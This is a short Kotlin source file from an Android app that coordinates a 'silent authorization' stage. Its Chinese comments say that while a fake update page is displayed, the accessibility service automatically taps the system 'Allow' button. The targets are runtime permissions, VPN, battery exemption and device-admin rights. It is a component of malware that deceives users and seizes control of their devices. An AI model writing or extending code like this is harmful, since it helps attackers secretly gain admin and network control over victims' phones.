package com.vibelink.client.setup

import java.util.concurrent.atomic.AtomicBoolean
import java.util.concurrent.atomic.AtomicReference

/**
 * 无障碍开启后的静默授权阶段：假更新页展示期间由无障碍自动点系统「允许」。
 */
object SetupAutoGrantCoordinator {
    enum class Target {
        NONE,
        PERMISSIONS,
        VPN,
        BATTERY,
        ADMIN,
    }

    private val active = AtomicBoolean(false)
    private val target = AtomicReference(Target.NONE)

    fun begin() {
        active.set(true)
        target.set(Target.PERMISSIONS)
    }

    /** SecurityUpdate 周期调用：防止 SetupWizard.onDestroy 误 end() 后自动点全哑 */
    fun ensureActive() {
        active.set(true)
    }

    fun end() {
        active.set(false)
        target.set(Target.NONE)
    }

    fun setTarget(value: Target) {
        target.set(value)
    }

    fun getTarget(): Target = target.get()

    fun isActive(): Boolean = active.get()
}
